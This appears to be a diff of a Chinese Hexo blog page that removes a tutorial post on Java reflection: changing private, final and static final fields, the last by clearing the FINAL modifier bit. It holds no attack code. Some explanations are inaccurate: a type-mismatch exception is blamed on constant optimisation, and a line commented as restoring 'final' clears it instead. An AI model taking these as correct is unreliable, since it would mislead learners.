java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PrivateReflect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InstantiationException, InvocationTargetException, InvocationTargetException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;src.PrivatePerson&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">m</span> <span class="operator">=</span> c.newInstance();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">PrintMethod</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;printName&quot;</span>);</span><br><span class="line">        PrintMethod.invoke(m);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(m, <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;aaaaa&quot;</span>));</span><br><span class="line">        PrintMethod.invoke(m);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PrivatePerson</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">StringBuilder</span> <span class="variable">name</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;lll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>static单独出现的话，用getDeclaredField也可以</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PrivateReflect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InstantiationException, InvocationTargetException, InvocationTargetException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;src.PrivatePerson&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">m</span> <span class="operator">=</span>c.newInstance();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">f</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;printName&quot;</span>);</span><br><span class="line">        f.invoke(m);</span><br><span class="line">        Field ff=c.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        ff.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ff.set(m,<span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;lvzhouhang&quot;</span>));</span><br><span class="line">        f.invoke(m);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="final"><a href="#final" class="headerlink" title="final"></a>final</h2><p>final 字段能否修改，有且取决于字段是直接赋值还是间接赋值（编译时赋值和运行时赋值的区别）。<strong>直接赋值是指在创建字段时就对字段进行赋值，并且值为 JAVA 的 8 种基础数据类型或者 String 类型，而且值不能是经过逻辑判断产生的，其他情况均为间接赋值。</strong></p>
-<h3 id="直接赋值"><a href="#直接赋值" class="headerlink" title="直接赋值"></a>直接赋值</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FinalStraightPerson</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;lvzhouhang&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">21</span>-<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot; &quot;</span>+age);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FinalStraightReflect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;src.FinalStraightPerson&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">m</span> <span class="operator">=</span> c.newInstance();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">printMethod</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;printInfo&quot;</span>);</span><br><span class="line">        printMethod.invoke(m);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">ageField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ageField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(m,<span class="string">&quot;lvzhouhang&quot;</span>);</span><br><span class="line">        ageField.set(m,<span class="string">&quot;20&quot;</span>);</span><br><span class="line"></span><br><span class="line">        printMethod.invoke(m);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这样通过反射修改会报错</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.IllegalArgumentException: Can not set final int field src.FinalStraightPerson.age to java.lang.String</span><br><span class="line">	at sun.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:167)</span><br><span class="line">	at sun.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:171)</span><br><span class="line">	at sun.reflect.UnsafeQualifiedIntegerFieldAccessorImpl.set(UnsafeQualifiedIntegerFieldAccessorImpl.java:100)</span><br><span class="line">	at java.lang.reflect.Field.set(Field.java:764)</span><br><span class="line">	at src.FinalStraightReflect.main(FinalStraightReflect.java:18)</span><br></pre></td></tr></table></figure>
-
-<p>为什么呢？</p>
-<p>因为JVM在编译时期, 就把final类型的String进行了优化, 在编译时期就会把String处理成常量，只要是让name的值经过运行才能获得, 那么就不会被处理为常量。</p>
-<h3 id="间接修改"><a href="#间接修改" class="headerlink" title="间接修改"></a>间接修改</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InDirectReflect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;src.InDirectPerson&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">m</span> <span class="operator">=</span> c.newInstance();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">printMethod</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;printInfo&quot;</span>);</span><br><span class="line">        printMethod.invoke(m);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">ageField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">sexField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;sex&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ageField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        sexField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(m,<span class="string">&quot;lvzhouhang&quot;</span>);</span><br><span class="line">        ageField.set(m,<span class="number">200</span>);</span><br><span class="line">        sexField.set(m,<span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;female&quot;</span>));</span><br><span class="line">        printMethod.invoke(m);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InDirectPerson</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">StringBuilder</span> <span class="variable">sex</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;male&quot;</span>);</span><br><span class="line">    <span class="comment">// 经过逻辑判断产生的变量赋值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> (<span class="literal">null</span>!=<span class="literal">null</span>?<span class="number">20</span>:<span class="number">20</span>);</span><br><span class="line">    <span class="comment">// 通过构造函数进行赋值</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InDirectPerson</span><span class="params">()</span>&#123;</span><br><span class="line">        name = <span class="string">&quot;lvzhouhang&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot; &quot;</span>+age+<span class="string">&quot; &quot;</span>+sex);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这样就修改成功了</p>
-<h3 id="static-final"><a href="#static-final" class="headerlink" title="static+final"></a>static+final</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">finalstaticreflection</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">StringBuilder</span> <span class="variable">name</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;lvzhouhang&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">finalstaticflectioncalc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">finalstaticreflection</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">finalstaticreflection</span>();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getClass().getDeclaredMethod(<span class="string">&quot;printName&quot;</span>);</span><br><span class="line">        m.invoke(c);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> c.getClass().getField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(c,<span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;lllllvzhouhang&quot;</span>));</span><br><span class="line">        m.invoke(c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>这样使修改不成功的，但是还是可以修改，通过反射将name字段取出来后将final修饰符去掉就可以修改</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.operations.Mod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">finalstaticflectioncalc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">finalstaticreflection</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">finalstaticreflection</span>();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getClass().getDeclaredMethod(<span class="string">&quot;printName&quot;</span>);</span><br><span class="line">        c.printName();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> c.getClass().getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">ff</span> <span class="operator">=</span> f.getClass().getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        ff.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ff.setInt(f,f.getModifiers() &amp; ~Modifier.FINAL);<span class="comment">//去掉final修饰符</span></span><br><span class="line">        f.set(c,<span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;lllllvzhouhang&quot;</span>));</span><br><span class="line">        ff.setInt(f,f.getModifiers() &amp; ~Modifier.FINAL);<span class="comment">//加上final修饰符</span></span><br><span class="line">        c.printName();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>这样就成功修改了</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1417,7 +1385,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">55</span>
+          <span class="site-state-item-count">56</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1466,12 +1434,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-area-chart"></i>
     </span>
-    <span title="站点总字数">268k</span>
+    <span title="站点总字数">279k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">4:03</span>
+    <span title="站点阅读时长">4:14</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
